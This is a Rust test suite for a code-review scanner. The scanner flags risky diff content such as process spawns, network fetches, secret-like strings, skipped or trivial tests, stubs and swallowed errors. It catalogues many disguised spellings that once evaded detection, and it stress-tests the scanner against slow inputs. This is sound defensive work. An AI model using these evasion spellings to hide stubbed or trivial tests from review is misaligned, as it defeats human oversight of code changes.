        let braces = format!("+{}", "}".repeat(64 << 10));
        assert_eq!(
            found(&hunk_of("src/big.rs", &[&braces, "+    y.unwrap();"])),
            [(S::PanicPathAdded, Basis::Lexical, 3)]
        );
        for line in [
            "+    x.unwrap_or(1);",
            "+    x.expect_err(\"e\");",
            "+    let s = \"a.unwrap()\"; // b.unwrap()",
            "+    unwrap(x);",
            "-    f().unwrap();",
        ] {
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), [], "{line}");
        }
        // another language has no such rule
        assert_eq!(found(&hunk_of("a.py", &["+x.unwrap()"])), []);
    }

    /// The items of the line rules and of the token reader come out together: in line order,
    /// and on a line in the order of [`EvidenceSignal::ALL`].
    #[test]
    fn the_items_of_both_kinds_of_rule_keep_one_order() {
        let file = hunk_of(
            "src/a.rs",
            &[
                "+    let c = std::process::Command::new(\"x\");",
                "+    let v = unsafe { f() }.unwrap();",
                "+    todo!()",
                "+    #[allow(x)] #[ignore] fn t() { assert!(true); todo!(); a.unwrap(); }",
            ],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 2),
                (S::UnsafeAdded, Basis::Lexical, 3),
                (S::PanicPathAdded, Basis::Lexical, 3),
                (S::StubAdded, Basis::Lexical, 4),
                (S::CheckSuppressed, Basis::Lexical, 5),
                (S::TestSkipped, Basis::Lexical, 5),
                (S::TrivialAssert, Basis::Lexical, 5),
                (S::StubAdded, Basis::Lexical, 5),
                (S::PanicPathAdded, Basis::Lexical, 5),
            ]
        );
    }

    /// These are read on added lines only: removing a skip or a stub is the repair.
    #[test]
    fn removing_a_skip_a_trivial_assert_or_a_stub_is_not_evidence() {
        for (path, line) in [
            ("tests/a.rs", "#[ignore]"),
            ("tests/a.rs", "    assert!(true);"),
            ("src/a.rs", "    todo!()"),
            ("test_a.py", "@pytest.mark.skip"),
            ("a.py", "    raise NotImplementedError"),
        ] {
            assert_eq!(signals(&removed(path, &[line])), [], "{path}: {line}");
        }
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
                ("test_skipped", 3),
                ("trivial_assert", 3),
                ("stub_added", 3),
                ("error_swallowed", 3),
                ("panic_path_added", 3),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
        // the reader's items are merged by this order
        let mut ordered = EvidenceSignal::ALL;
        ordered.sort();
        assert_eq!(ordered, EvidenceSignal::ALL);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
    /// Review V3 round 1, VD3-H-1: an attribute that only mentions `test` proves no test, so the
    /// panic path under it stands. Before, `#[cfg_attr(any(), test)]` on a production function
    /// made the item disappear.
    #[test]
    fn a_false_test_context_does_not_withdraw_a_panic_path() {
        let stands: &[(&[&str], bool)] = &[
            (
                &[
                    "+#[cfg_attr(any(), test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+#[cfg_attr(feature = \"x\", test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            // review V3 round 2, VD3R2-H-1: an unknown path that ends in `test` (it spells a
            // test, so it has the hint, and the item stands)
            (
                &[
                    "+#[my_framework::test]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                true,
            ),
            (
                &[
                    "+#[my_attribute(test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+#[cfg(not(test))]",
                    "+mod real {",
                    "+    pub fn production() {",
                    "+        load().unwrap();",
                    "+    }",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+mod tests {",
                    "+    pub fn production() {",
                    "+        load().unwrap();",
                    "+    }",
                    "+}",
                ],
                false,
            ),
        ];
        for (body, hinted) in stands {
            let items: Vec<(EvidenceSignal, Basis, bool)> =
                file_evidence(&hunk_of("src/a.rs", body))
                    .iter()
                    .map(|e| (e.signal, e.basis, e.test_likely))
                    .collect();
            assert_eq!(
                items,
                [(S::PanicPathAdded, Basis::Lexical, *hinted)],
                "{body:?}"
            );
        }
        // and so does one under a real `#[cfg(test)]` in a new file: nothing is withdrawn
        let real = found(&new_file(
            "src/a.rs",
            &["#[cfg(test)]", "fn a() {", "    load().unwrap();", "}"],
        ));
        assert_eq!(real, [(S::PanicPathAdded, Basis::Lexical, 3)]);
    }

    /// Review V3 round 1, VD3-M-1: a change inside a construct that started on an unchanged
    /// line is a change to the construct, reported on the added line.
    #[test]
    fn an_added_line_inside_a_construct_that_spans_lines_is_evidence() {
        let assertion = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn checks() {",
                "     assert!(",
                "-        computes_answer()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(assertion, [(S::TrivialAssert, Basis::Hunk, 4)]);
        // Review V3 round 2, VD3R2-M-1: a construct that was already what it is now is not
        // added by a change to its message. Before, these three were reported. No token of
        // `todo!(` or of `assert!(true,` is on an added line: a string is blank, and what
        // follows the construct is not part of it.
        for (path, body) in [
            (
                "src/m.rs",
                &[" fn f() {", "     todo!(", "+        \"later\"", "     )"][..],
            ),
            (
                "src/m.rs",
                &[
                    " fn later() {",
                    "     todo!(",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     )",
                ][..],
            ),
            (
                "tests/m.rs",
                &[
                    " fn check() {",
                    "     assert!(",
                    "         true,",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     );",
                ][..],
            ),
        ] {
            assert_eq!(found(&hunk_of(path, body)), [], "{body:?}");
        }
        // a stub that replaces what was there is added, on the added line
        let stub = found(&hunk_of(
            "src/m.rs",
            &[
                " fn f() -> u8 {",
                "     compute(",
                "-        1",
                "+        todo!()",
                "     )",
            ],
        ));
        assert_eq!(stub, [(S::StubAdded, Basis::Lexical, 4)]);
        // an unchanged construct beside an added line is still not evidence
        let beside = found(&hunk_of(
            "tests/m.rs",
            &[" fn checks() {", "     assert!(true);", "+    let a = 1;"],
        ));
        assert_eq!(beside, []);
        // a `catch` whose empty block is on the next line
        let catch = found(&hunk_of(
            "web/a.ts",
            &[
                " try { work(); }",
                "-catch (e) { report(e); }",
                "+catch",
                "+{ }",
            ],
        ));
        assert_eq!(catch, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        let bound = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{}"],
        ));
        assert_eq!(bound, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        // a block with something in it is not
        let handled = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{ report(e); }"],
        ));
        assert_eq!(handled, []);
    }

    /// Third independent review, IR3-M-4. The parser took a macro's arguments as text with the
    /// whitespace removed, comments included, so `true // always` read `true//always` and the
    /// assertion was "not trivial"; nothing marked it, the word `assert` being the
    /// construct's own name. A comment is blank in the code view the tokens are cut from. The
    /// review's six patches: the first compiled and ran, `test checks ... ok`.
    #[test]
    fn a_comment_inside_an_assertion_is_no_token_of_it() {
        let trivial = |line: u32, basis: Basis| vec![(S::TrivialAssert, basis, line)];
        // `ca1.patch`, `ca2.patch`, `ca3.patch`: new files
        assert_eq!(
            found(&new_file(
                "src/ca1.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(",
                    "        true // always",
                    "    );",
                    "}",
                ]
            )),
            trivial(3, Basis::Hunk)
        );
        assert_eq!(
            found(&new_file(
                "src/ca2.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(",
                    "        true /* always */, \"msg\"",
                    "    );",
                    "}",
                ]
            )),
            trivial(3, Basis::Hunk)
        );
        assert_eq!(
            found(&new_file(
                "src/ca3.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(true /* always */);",
                    "    assert!(/* c */ true);",
                    "}",
                ]
            )),
            [
                (S::TrivialAssert, Basis::Lexical, 3),
                (S::TrivialAssert, Basis::Lexical, 4)
            ]
        );
        // `ca4.patch`, `ca5.patch`, `ca6.patch`: a change under an unchanged `assert!(`
        assert_eq!(
            found(&hunk_of(
                "src/ca4.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert!(",
                    "-        compute() == 4,",
                    "+        true, // compute() == 4",
                    "         \"msg\"",
                    "     );",
                    " }",
                ]
            )),
            trivial(5, Basis::Hunk)
        );
        assert_eq!(
            found(&hunk_of(
                "src/ca5.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert!(",
                    "-        compute() == 4",
                    "+        // compute() == 4",
                    "+        true",
                    "     );",
                    " }",
                ]
            )),
            trivial(6, Basis::Hunk)
        );
        assert_eq!(
            found(&hunk_of(
                "src/ca6.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert_eq!(",
                    "-        compute(),",
                    "-        4",
                    "+        true, // compute(),",
                    "+        true",
                    "     );",
                    " }",
                ]
            )),
            trivial(5, Basis::Hunk)
        );
    }

    /// Third independent review, IR3-M-3. Where the grammar read a comment and the compiler
    /// reads code, a construct that only the parser found left nothing: `įĪ` inside a block
    /// comment read as `/*` to the grammar's scanner, so the lines after it were a comment to
    /// the parser, and the call over three lines was found by no one. The code view is right
    /// about these lines, and the tokens are cut from it. The first compiled and ran to a
    /// panic.
    #[test]
    fn a_construct_the_grammar_took_for_a_comment_is_read() {
        // `gc1.patch`, `gc2.patch`, `gc3.patch`, `gc4.patch`
        assert_eq!(
            found(&new_file(
                "src/gc1.rs",
                &[
                    "pub fn production(x: Option<u32>) -> u32 {",
                    "    /* įĪ */ let v = x",
                    "        .unwrap",
                    "        (); // */",
                    "    v",
                    "}",
                ]
            )),
            [(S::PanicPathAdded, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc2.rs",
                &[
                    "pub fn production(x: Option<u32>) -> u32 {",
                    "    let r#Ģ = 1; let v = x",
                    "        .unwrap",
                    "        (); // \"#",
                    "    ; v + r#Ģ",
                    "}",
                ]
            )),
            [(S::PanicPathAdded, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc3.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    /* įĪ */ assert!(",
                    "        true",
                    "    ); // */",
                    "}",
                ]
            )),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc4.rs",
                &[
                    "/* įĪ */ #[test] #[",
                    "    ignore] // */",
                    "fn checks() {",
                    "    assert_eq!(compute(), 4);",
                    "}",
                ]
            )),
            [(S::TestSkipped, Basis::Hunk, 1)]
        );
    }

    /// Third independent review, IR3-M-5. A method call with generic arguments was no
    /// construct to the parser, and the line rule wanted `(` straight after the name. Each of
    /// these compiles (`expect::<'static>` with a warning) and panics: `tf1.patch` to
    /// `tf5.patch`. The three with `::<>` were `syntax_unchecked`, the two with a lifetime
    /// nothing.
    #[test]
    fn a_method_call_with_generic_arguments_is_a_panic_path() {
        for call in [
            "b().unwrap::<>()",
            "b().expect::<>(\"no\")",
            "b().expect::<'static>(\"no\")",
        ] {
            let body = [
                "fn b() -> Option<u32> { None }",
                "pub fn production() -> u32 {",
                &format!("    let v = {call};"),
                "    v",
                "}",
            ];
            assert_eq!(
                found(&new_file("src/tf.rs", &body)),
                [(S::PanicPathAdded, Basis::Lexical, 3)],
                "{call}"
            );
        }
        for call in ["b().unwrap::<>()", "b().expect::<'_>(\"no\")"] {
            let body = [
                " fn b() -> Option<u32> { None }",
                " pub fn production() -> u32 {",
                "-    let v = b().unwrap_or(1);",
                &format!("+    let v = {call};"),
                "     v",
                " }",
            ];
            assert_eq!(
                found(&hunk_of("src/tf.rs", &body)),
                [(S::PanicPathAdded, Basis::Lexical, 4)],
                "{call}"
            );
        }
    }

    /// Review V3 round 1, VD3-L-1: more spellings of the same things.
    #[test]
    fn other_spellings_of_a_skip_a_swallowed_rejection_and_a_panic_path_are_evidence() {
        let lexical = |signal| vec![(signal, Basis::Lexical, 2)];
        assert_eq!(
            found(&hunk_of(
                "web/a.test.ts",
                &["+test.skipIf(isCI)(\"adds\", () => {});"]
            )),
            lexical(S::TestSkipped)
        );
        // the function form, in plain code and inside another macro's body
        for line in [
            "+let v = Result::unwrap(read());",
            "+let v = Option::expect(first(), \"one\");",
        ] {
            assert_eq!(
                found(&hunk_of("src/u.rs", &[line])),
                lexical(S::PanicPathAdded),
                "{line}"
            );
            assert_eq!(
                found(&hunk_of(
                    "src/u.rs",
                    &[&format!("+outer! {{ {} }}", &line[1..])]
                )),
                lexical(S::PanicPathAdded),
                "{line}"
            );
        }
        for line in [
            "+run().catch(() => {});",
            "+p.catch(()=>{});",
            "+p.catch(e => {});",
            "+p.catch((e) => { });",
            "+p.catch(async (e) => {});",
            "+p.catch(function () {});",
            "+p.catch(function(e) { });",
            // review V3 round 2, VD3R2-L-1: a default value that calls a function
            "+run().catch((error = fallback()) => {});",
            "+run().catch(function (error = fallback()) {});",
            "+run().catch(async (error = fallback(a, (b))) => {});",
            "+run().catch(function onError(error) {});",
        ] {
            assert_eq!(
                found(&hunk_of("web/p.ts", &[line])),
                [(S::ErrorSwallowed, Basis::Hunk, 2)],
                "{line}"
            );
        }
        // a handler that does something, a named handler, and other calls named catch are not
        for line in [
            "+p.catch((e) => { report(e); });",
            "+p.catch(report);",
            "+p.catch(() => report());",
            "+p.catch(() => ({}));",
            "+cache.catchUp(() => {});",
            "+p.catch();",
            "+p.catch((error = fallback() => {});",
            "+p.catch((error = fallback()) => { report(error); });",
        ] {
            assert_eq!(found(&hunk_of("web/p.ts", &[line])), [], "{line}");
        }
        // a conditional skip is still reported: under some configuration the test does not run
        assert_eq!(
            found(&hunk_of(
                "tests/t.rs",
                &["+#[cfg_attr(miri, ignore)]", "+#[test]", "+fn a() {}"]
            ))
            .iter()
            .map(|i| i.0)
            .collect::<Vec<_>>(),
            [S::TestSkipped]
        );
    }

    /// Review V3 round 2, VD3R2-H-2, round 3, VD3R3-H-2, and the second independent review,
    /// IR2-H-5. While a parser read the hunks, a review had budgets (bytes, then also the
    /// squares of bytes), a plan that spent them in the review's order, and a mark for the
    /// hunks left unread: whoever ordered the hunks decided which were parsed. There is no
    /// budget now. Each hunk's answer is its own, whatever stands before it in the review:
    /// the same files that once spent the budget after three hunks each give their item.
    #[test]
    fn every_hunk_of_a_review_is_read_whatever_came_before_it() {
        // each hunk: one added line of about 12 KB, then an added panic path
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler, "+    y.unwrap();"]))
            .collect();
        let ranked = crate::rank(&files);
        assert_eq!(ranked.len(), files.len());
        for (file, ranked) in files.iter().zip(&ranked) {
            // (before: `syntax_fragment` for the first three, then the item with
            // `syntax_unchecked` beside it)
            assert_eq!(found(file), [(S::PanicPathAdded, Basis::Lexical, 3)]);
            let items: Vec<(EvidenceSignal, Basis, u32)> = ranked
                .evidence
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect();
            assert_eq!(items, [(S::PanicPathAdded, Basis::Lexical, 3)]);
        }
        // a review of typical size, forty hunks of 2 KiB with a panic path in each
        let filler = format!("+    let x = {};", "1 + ".repeat(500) + "1");
        for n in 0..40 {
            let file = hunk_of(&format!("src/t{n}.rs"), &[&filler, "+    y.unwrap();"]);
            assert_eq!(
                found(&file),
                [(S::PanicPathAdded, Basis::Lexical, 3)],
                "{n}"
            );
        }
        // hunks with nothing in them give nothing, whatever their size and their language
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        for file in [
            hunk_of("a.py", &[&filler]),
            hunk_of("src/removed.rs", &["-    y.unwrap();"]),
            hunk_of("src/plain.rs", &[&filler]),
        ] {
            assert_eq!(found(&file), [], "{}", file.path);
        }
        // a construct can open on an unchanged line and reach an added one
        assert_eq!(
            found(&hunk_of(
                "src/context.rs",
                &["     assert!(", "+        true", "     );"]
            )),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
    }

    /// Second independent review, IR2-H-5, and the third, IR3-H-1. For some text the parser's
    /// time grew with the square of the length: `// todo`, a newline and `#!#!#!…` took 15 s
    /// at 64 KiB, and, inside the budget of squares that was sized on that text, the same
    /// with `&)` took 15 s at 8 KB and 118 s at 22 KB (release build). No count multiplied by
    /// a constant measured on one text bounds a parser on another. The reader of tokens has
    /// no such text: it does a bounded amount of work for each token. Here each unit the
    /// reviews found slow, and each word the reader looks from, is ranked at the two sizes of
    /// the third review and at two million bytes: on one line and a unit a line, under a word
    /// the parser read, as a new file and as a change.
    #[test]
    fn two_megabytes_of_any_text_cost_what_they_are_long() {
        for unit in [
            "&)",
            "#!",
            "a?b:",
            ".unwrap",
            "assert!(",
            "#[cfg_attr(",
            "::<",
            // more of the third review's slow pairs, and the reader's own long looks
            ",*",
            "->*",
            "a,",
            ".unwrap::<",
            "Result::<",
            "X::<a>::unwrap",
            "#[cfg_attr(a, cfg_attr(",
            "#[test] fn a() {",
            "#[",
            "}",
        ] {
            let slowest = within_deadline(move || {
                let mut slowest = (std::time::Duration::ZERO, 0, "");
                for bytes in [8_000, 22_000, 2_000_000] {
                    let count = bytes / unit.len();
                    let one_line = format!("// todo\n{}", unit.repeat(count));
                    let a_unit_a_line = format!(
                        "// todo\n{}",
                        format!("{unit}\n").repeat((count / 2).min(150_000))
                    );
                    for text in [one_line, a_unit_a_line] {
                        let lines: Vec<&str> = text.lines().collect();
                        let file = new_file("src/hostile.rs", &lines);
                        let changed: Vec<String> = lines
                            .iter()
                            .enumerate()
                            .map(|(n, line)| format!("{}{line}", ['+', '-', ' '][n % 3]))
                            .collect();
                        let changed: Vec<&str> = changed.iter().map(String::as_str).collect();
                        let change = hunk_of("src/hostile.rs", &changed);
                        let start = ScanClock::start();
                        let ranked = crate::rank(&[file, change]);
                        let spent = start.elapsed();
                        assert_eq!(ranked.len(), 2);
                        if spent > slowest.0 {
                            slowest = (spent, text.len(), start.kind);
                        }
                    }
                }
                slowest
            });
            // A debug build ranks the slowest of these pairs in about a second of CPU time (a
            // release build in a few hundredths). The parser took 118 s for 22 KB of the
            // first unit, in a release build.
            assert!(
                slowest.0 < COST_BOUND,
                "{} bytes of {unit:?} took {:?} of {}",
                slowest.1,
                slowest.0,
                slowest.2
            );
        }
    }

    /// The most CPU time ranking two megabytes of one unit may take in a test build.
    const COST_BOUND: std::time::Duration = std::time::Duration::from_secs(20);

    /// A hunk with very many items is read in one pass. The parser's answer used to be merged
    /// by searching the items for each construct and then sorting them with a key that searched
    /// the hunk: a hunk of 300,000 such lines did not finish in 30 seconds. The token reader's
    /// items come in hunk order and are merged with one index that only moves forward.
    #[test]
    fn a_hunk_with_very_many_items_is_read_in_one_pass() {
        const LINES: usize = 150_000;
        let added = vec!["+    y.unwrap();"; LINES];
        let matches = |file: &ReviewFile| {
            let kind = FileKind::of(file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            hunk_matches(&file.patch_twin.hunks[0], kind.language, &rules).items
        };
        // every line is an item (before: and one more, the mark of a hunk the parser did not
        // read)
        let items = within_deadline(move || matches(&hunk_of("src/a.rs", &added)));
        assert_eq!(items.len(), LINES);
        assert_eq!(
            &items[..2],
            [
                (Side::New, S::PanicPathAdded, 2, Basis::Lexical),
                (Side::New, S::PanicPathAdded, 3, Basis::Lexical),
            ]
        );
        assert!(items.windows(2).all(|pair| pair[0].2 < pair[1].2));
        // as many items on the old side, and one on the new
        let mut removed = vec!["-#[test]"; LINES];
        removed.push("+    y.unwrap();");
        let items = within_deadline(move || matches(&hunk_of("tests/a.rs", &removed)));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(items[0], (Side::Old, S::TestRemoved, 2, Basis::Lexical));
        assert_eq!(
            items[LINES],
            (Side::New, S::PanicPathAdded, 2, Basis::Lexical)
        );
        // a construct on every line and each over two lines: `x.` and `unwrap();`
        let split: Vec<&str> = (0..LINES)
            .map(|n| {
                if n % 2 == 0 {
                    "+    x."
                } else {
                    "+    unwrap();"
                }
            })
            .collect();
        let items = within_deadline(move || matches(&hunk_of("src/a.rs", &split)));
        assert_eq!(items.len(), LINES / 2);
        assert!(items.iter().all(|item| item.3 == Basis::Hunk));
    }

    /// Review V3 round 3, VD3R3-M-1. The parser compared a construct that reached an added
    /// line with the old side, and another trivial assertion on the same line, or an old side
    /// too large to parse, hid an assertion that the change made trivial. Nothing is compared
    /// with the old side now: a construct is judged by its own tokens, and the old side of a
    /// hunk can hold anything.
    #[test]
    fn a_construct_is_judged_by_its_own_tokens_whatever_the_old_side_holds() {
        let same_row = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true); assert!(",
                "-        computes()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(same_row, [(S::TrivialAssert, Basis::Hunk, 4)]);
        // the first of the two already was trivial and only its message changes: still nothing
        let first = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true,",
                "-        \"old\"",
                "+        \"new\"",
                "     ); assert!(computes());",
            ],
        ));
        assert_eq!(first, []);
        // an old side of 68 KB (before, under a review's plan: `syntax_unchecked`)
        let long = format!("-        {}", "1 + ".repeat(17_000) + "1 > 0");
        let file = hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(",
                long.as_str(),
                "+        true",
                "     );",
            ],
        );
        assert_eq!(found(&file), [(S::TrivialAssert, Basis::Hunk, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2. Whoever orders the hunks of a review must not be able to
    /// hide a later one. While the parser had a budget, harmless hunks could spend it, and a
    /// later construct that only the parser found gave no evidence, then a mark
    /// (`syntax_unchecked`). With no budget there is nothing to spend: the construct is found
    /// after any hunks.
    #[test]
    fn no_order_of_hunks_hides_a_construct() {
        // the assertion is over three lines
        let hidden: &[&str] = &["+    assert!(", "+        true", "+    );"];
        let filler = format!("+    let x = {};", "1 + ".repeat(15_000) + "1");
        // Vesper's reproduction: 40 harmless hunks of about 60 KB, then the construct
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler]))
            .collect();
        files.push(hunk_of("tests/last.rs", hidden));
        let evidence_of = |files: &[ReviewFile], path: &str| -> Vec<(EvidenceSignal, Basis, u32)> {
            crate::rank(files)
                .iter()
                .find(|file| file.path == path)
                .expect("the file is ranked")
                .evidence
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect()
        };
        assert_eq!(
            evidence_of(&files, "tests/last.rs"),
            [(S::TrivialAssert, Basis::Hunk, 2)]
        );
        // the same with filler that holds a word the parser read (hunks of about 12 KB, of
        // which its square budget took three): before, `syntax_unchecked` for the last file
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let costly = format!("{filler} // unwrap");
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&costly]))
            .collect();
        files.push(hunk_of(
            "tests/last.rs",
            &[&filler, "+    assert!(", "+        true", "+    );"],
        ));
        assert_eq!(
            evidence_of(&files, "tests/last.rs"),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
        assert_eq!(evidence_of(&files, "src/f0.rs"), []);
        assert_eq!(found(&hunk_of("a.py", &["+x = 1  # unwrap"])), []);
        // a stub after a line of 68 KB (before: with `syntax_unchecked` beside it)
        let later = hunk_of(
            "src/big.rs",
            &[
                "+    let a = 1;",
                &format!("+    let b = {};", "1 + ".repeat(17_000) + "1"),
                "+    todo ! ( );",
            ],
        );
        assert_eq!(found(&later), [(S::StubAdded, Basis::Lexical, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2: every spacing of a construct is the same tokens. (These
    /// spellings were taught to the line rules one by one, so that a hunk the parser did not
    /// read lost as little as could be; each line here is 70 KB long, which was past the
    /// parser's budget.)
    #[test]
    fn a_construct_is_read_whatever_its_spacing() {
        let pad = "a".repeat(70_000);
        for (line, signal) in [
            ("value.unwrap ();", S::PanicPathAdded),
            ("value . expect (\"set\");", S::PanicPathAdded),
            ("assert!( true );", S::TrivialAssert),
            ("assert ! (true , \"always\");", S::TrivialAssert),
            ("debug_assert!( true );", S::TrivialAssert),
            ("assert_eq!( true , true );", S::TrivialAssert),
            ("todo ! ();", S::StubAdded),
            ("unimplemented !( \"later\" )", S::StubAdded),
            ("# [ ignore ]", S::TestSkipped),
            ("#[ignore = \"slow\"]", S::TestSkipped),
            ("#[ cfg_attr( miri , ignore ) ]", S::TestSkipped),
            // the inputs the line rules' own functions were held to
            ("assert\t! ( true )", S::TrivialAssert),
            ("debug_assert_eq ! (true,true , \"m\")", S::TrivialAssert),
            ("assert!(true, true_enough)", S::TrivialAssert),
            ("# [ ignore = \"slow\" ]", S::TestSkipped),
            ("#[cfg_attr(miri, ignore = \"slow\")]", S::TestSkipped),
            // Tokens that are no Rust outside a macro's body, and inside one are what they
            // look like, since a macro can drop what stands before them (`x#[ignore]` up to
            // edition 2018: compiled and run, the test does not run). The line rules wanted
            // no name and no dot before the word.
            ("x.assert!(true);", S::TrivialAssert),
            ("x#[ignore]", S::TestSkipped),
        ] {
            for text in [format!("+    {line}"), format!("+    {line} // {pad}")] {
                assert_eq!(
                    found(&hunk_of("tests/a.rs", &[text.as_str()])),
                    [(signal, Basis::Lexical, 2)],
                    "{line}"
                );
            }
        }
        // the word itself is not split, a cut argument list does not match, and neither does
        // another macro that only begins or ends the same way
        for line in [
            "my_assert!( true );",
            "assert!( true_enough() );",
            "assert!( true == x );",
            "retodo ! ();",
            "x.unwrap_or ();",
            "unwrap ();",
            "#[cfg_attr(miri, allow(ignore_me))]",
            "ass ert!(true)",
            "assert!(tru",
            "assert!(true",
            "assert_ne!(true, true)",
            "assert_eq!(true)",
            "#[ignored]",
            "#[cfg_attr(miri, ignored)]",
            "[ignore]",
        ] {
            for text in [format!("+    {line}"), format!("+    {line} // {pad}")] {
                assert_eq!(
                    found(&hunk_of("tests/a.rs", &[text.as_str()])),
                    [],
                    "{line}"
                );
            }
        }
        // the one rule left that passes over spaces on a line: `# [allow(`
        assert!(spaced("# [ allow (x)]", &["#"], &["[allow("]));
        assert!(!spaced("", &["#"], &["[allow("]) && !spaced("#[allow(", &[], &["[allow("]));
        assert!(!spaced("x#[allow(x)]", &["#"], &["[allow("]));
        assert_eq!(follows(b"", b""), Some(0));
        assert_eq!(
            (follows(b"  ", b"!"), follows(b" ! (", b"!(")),
            (None, Some(4))
        );
    }
}
